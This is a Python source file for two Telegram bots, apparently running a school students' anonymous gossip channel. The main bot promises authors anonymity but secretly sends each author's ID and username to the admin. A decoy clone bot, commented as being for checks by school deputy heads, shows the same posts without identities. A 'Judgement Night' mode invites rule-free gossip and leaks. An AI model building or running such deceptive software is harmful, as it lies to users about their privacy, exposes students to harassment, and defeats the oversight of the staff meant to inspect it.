import telebot
from telebot import types
from flask import Flask, request
import os
import threading

# Загружаем скрытые токены из настроек Render
BOT_TOKEN = os.environ.get("BOT_TOKEN")
FAKE_BOT_TOKEN = os.environ.get("FAKE_BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
CHANNEL_USERNAME = os.environ.get("CHANNEL_USERNAME")

# Инициализируем обоих ботов
bot = telebot.TeleBot(BOT_TOKEN)
fake_bot = telebot.TeleBot(FAKE_BOT_TOKEN) if FAKE_BOT_TOKEN else None

app = Flask(__name__)

# Файлы баз данных на сервере
BLACKLIST_FILE = "blacklist.txt"
USERS_FILE = "users.txt"
STORIES_DB_FILE = "stories_db.txt"

judgement_night = False
admin_state = {}

def load_list(filename):
    if os.path.exists(filename):
        with open(filename, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    return []

def save_item(filename, item):
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"{item}\n")

def remove_item(filename, item):
    existing = load_list(filename)
    if str(item) in existing:
        existing.remove(str(item))
        with open(filename, "w", encoding="utf-8") as f:
            for i in existing:
                f.write(f"{i}\n")

BAN_MESSAGE = "❌ Ты забанен в нашем боте за спам или нарушение правил."

# --- ОБЩАЯ КЛАВИАТУРА АДМИНА ---
def get_admin_keyboard():
    global judgement_night
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📊 Статистика")
    markup.row("🚫 Забанить по ID", "🟢 Разбанить по ID")
    j_text = "🩸 Выключить Судную ночь" if judgement_night else "🩸 Включить Судную ночь"
    markup.row(j_text)
    markup.row("❌ Закрыть админку")
    return markup

# --- ОБРАБОТКА ДЛЯ ОБОИХ БОТОВ (ФУНКЦИЯ-ОБРАБОТЧИК) ---
def process_admin_commands(message, current_bot):
    global judgement_night
    if message.text == "📊 Статистика":
        total_users = len(set(load_list(USERS_FILE)))
        banned_users = len(load_list(BLACKLIST_FILE))
        current_bot.send_message(ADMIN_ID, f"📈 **Статистика подслушки:**\n\n👤 Учеников в боте: `{total_users}`\n🚫 В бане: `{banned_users}`", parse_mode="Markdown")
    
    elif message.text == "🚫 Забанить по ID":
        admin_state[ADMIN_ID] = "wait_ban"
        current_bot.send_message(ADMIN_ID, "Введите ID для бана:")
        
    elif message.text == "🟢 Разбанить по ID":
        admin_state[ADMIN_ID] = "wait_unban"
        current_bot.send_message(ADMIN_ID, "Введите ID для разбана:")
        
    elif message.text in ["🩸 Включить Судную ночь", "🩸 Выключить Судную ночь"]:
        judgement_night = not judgement_night
        status = "ВКЛЮЧЕН" if judgement_night else "ВЫКЛЮЧЕН"
        current_bot.send_message(ADMIN_ID, f"🔔 Режим Судной ночи **{status}**!", reply_markup=get_admin_keyboard())
        
        if judgement_night:
            bot.send_message(CHANNEL_USERNAME, "🚨🩸 **ВНИМАНИЕ! НА КАНАЛЕ НАЧАЛАСЬ СУДНАЯ НОЧЬ!** 🩸🚨\n\nЦензура и правила отключены! Сливы публикуются прямо сейчас! 😈👇")
        else:
            bot.send_message(CHANNEL_USERNAME, "🛑 🩸 **СУДНАЯ НОЧЬ ОКОНЧЕНА.** 🛑\n\nРежим повышенной жесткости отключен.")
            
    elif message.text == "❌ Закрыть админку":
        current_bot.send_message(ADMIN_ID, "Админка закрыта.", reply_markup=types.ReplyKeyboardRemove())

    # Обработка ввода текстового ID
    elif admin_state.get(ADMIN_ID) == "wait_ban":
        admin_state[ADMIN_ID] = None
        save_item(BLACKLIST_FILE, message.text.strip())
        current_bot.send_message(ADMIN_ID, f"✅ Пользователь {message.text} забанен!")
        
    elif admin_state.get(ADMIN_ID) == "wait_unban":
        admin_state[ADMIN_ID] = None
        remove_item(BLACKLIST_FILE, message.text.strip())
        current_bot.send_message(ADMIN_ID, f"✅ Пользователь {message.text} разбанен!")

# --- СТАРТ ОСНОВНОГО БОТА (ДЛЯ УЧЕНИКОВ) ---
@bot.message_handler(commands=['admin'])
def main_admin(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(ADMIN_ID, "⚙️ **Админ-панель (Оригинал):**", reply_markup=get_admin_keyboard(), parse_mode="Markdown")

@bot.message_handler(commands=['start'])
def main_start(message):
    user_id = message.from_user.id
    if str(user_id) in load_list(BLACKLIST_FILE):
        bot.send_message(message.chat.id, BAN_MESSAGE)
        return
    save_item(USERS_FILE, user_id)
    if judgement_night:
        bot.send_message(message.chat.id, "🚨 **🚨 СУДНАЯ НОЧЬ НАЧАЛАСЬ!** 🚨\n\nПравила отключены! Пишите абсолютно любые сплетни! 🩸😈")
    else:
        bot.send_message(message.chat.id, "Привет! Напиши сюда свой секрет или историю, и admin опубликует её анонимно.\n\nВ самом канале никто не узнает, кто автор!")

@bot.message_handler(func=lambda message: True)
def main_all(message):
    user_id = message.from_user.id
    if str(user_id) in load_list(BLACKLIST_FILE):
        bot.send_message(message.chat.id, BAN_MESSAGE)
        return

    if user_id == ADMIN_ID:
        process_admin_commands(message, bot)
        return

    # Прием истории
    with open(STORIES_DB_FILE, "a", encoding="utf-8") as f:
        f.write(f"{message.message_id}:{message.text.replace('\n', ' ')}\n")

    prefix = "🩸 [СУДНАЯ НОЧЬ]" if judgement_night else "📩 Новая история!"
    
    # 1. Отправляем в ОРИГИНАЛЬНОГО бота (с деаноном)
    user_info = f"{prefix}\n🆔 ID автора (СЕКРЕТНО): `{user_id}`\n🔗 Юзернейм: @{message.from_user.username if message.from_user.username else 'отсутствует'}\n-------------------------\n\n{message.text}"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(text="📢 Опубликовать", callback_data=f"pub_{message.message_id}"))
    bot.send_message(ADMIN_ID, user_info, parse_mode="Markdown", reply_markup=markup)
    
    # 2. Отправляем в КЛОНА (без деанона — для проверок завучей)
    if fake_bot:
        fake_info = f"📩 **Новое анонимное предложение**\nℹ️ Данные автора: сообщение анонима:\n-------------------------\n\n{message.text}"
        fake_markup = types.InlineKeyboardMarkup()
        fake_markup.add(types.InlineKeyboardButton(text="📢 Опубликовать анонимно", callback_data=f"pub_{message.message_id}"))
        try: fake_bot.send_message(ADMIN_ID, fake_info, parse_mode="Markdown", reply_markup=fake_markup)
        except: pass

    bot.send_message(message.chat.id, "Спасибо! Твоя история отправлена на модерацию.")

# --- СТАРТ ФЕЙКОВОГО БОТА (КЛОНА ДЛЯ ПРОВЕРОК) ---
if fake_bot:
    @fake_bot.message_handler(commands=['admin'])
    def fake_admin(message):
        if message.from_user.id == ADMIN_ID:
            fake_bot.send_message(ADMIN_ID, "⚙️ **Админ-панель (Анонимная версия):**", reply_markup=get_admin_keyboard(), parse_mode="Markdown")

    @fake_bot.message_handler(commands=['start'])
    def fake_start(message):
        if message.from_user.id == ADMIN_ID:
            fake_bot.send_message(ADMIN_ID, "Добро пожаловать в анонимную систему модерации.")

    @fake_bot.message_handler(func=lambda message: True)
    def fake_all(message):
        if message.from_user.id == ADMIN_ID:
            process_admin_commands(message, fake_bot)

# --- ПУБЛИКАЦИЯ В КАНАЛ (ОБЩАЯ ДЛЯ ОБОИХ) ---
def handle_publish(call, current_bot):
    try:
        msg_id_str = call.data.replace("pub_", "")
        story_text = None
        if os.path.exists(STORIES_DB_FILE):
            with open(STORIES_DB_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    if line.startswith(msg_id_str + ":"):
                        story_text = line.split(":", 1)[1].strip()
                        break
        if not story_text:
            current_bot.answer_callback_query(call.id, "Ошибка: история не найдена")
            return
        
        clean_post = f"🩸 **[СУДНАЯ НОЧЬ]** 🩸\n\n{story_text}" if judgement_night else f"{story_text}\n\n*(Анонимно)*"
        bot.send_message(chat_id=CHANNEL_USERNAME, text=clean_post)
        current_bot.edit_message_reply_markup(chat_id=ADMIN_ID, message_id=call.message.message_id, reply_markup=None)
        current_bot.send_message(ADMIN_ID, "✅ Успешно опубликовано!")
    except Exception as e:
        current_bot.send_message(ADMIN_ID, f"❌ Ошибка публикации: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("pub_"))
def main_inline(call):
    if call.from_user.id == ADMIN_ID: handle_publish(call, bot)

if fake_bot:
    @fake_bot.callback_query_handler(func=lambda call: call.data.startswith("pub_"))
    def fake_inline(call):
        if call.from_user.id == ADMIN_ID: handle_publish(call, fake_bot)

# --- ВЕБ-СЕРВЕР Flask ДЛЯ RENDER ---
@app.route("/")
def home():
    return "Оба бота работают круглосуточно!", 200

if __name__ == "__main__":
    # Запускаем Flask-сервер в отдельном потоке
    port = int(os.environ.get("PORT", 5000))
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=port, use_reloader=False)).start()
    
    # Очищаем вебхуки основного бота
    bot.remove_webhook()
    
    # Если клон подключен, запускаем его параллельно в фоновом потоке
    if fake_bot:
        fake_bot.remove_webhook()
        threading.Thread(target=fake_bot.infinity_polling, daemon=True).start()
        print("Бот-клон для проверок успешно запущен!")
        
    print("Основной бот успешно запущен на Render в режиме Polling...")
    bot.infinity_polling()
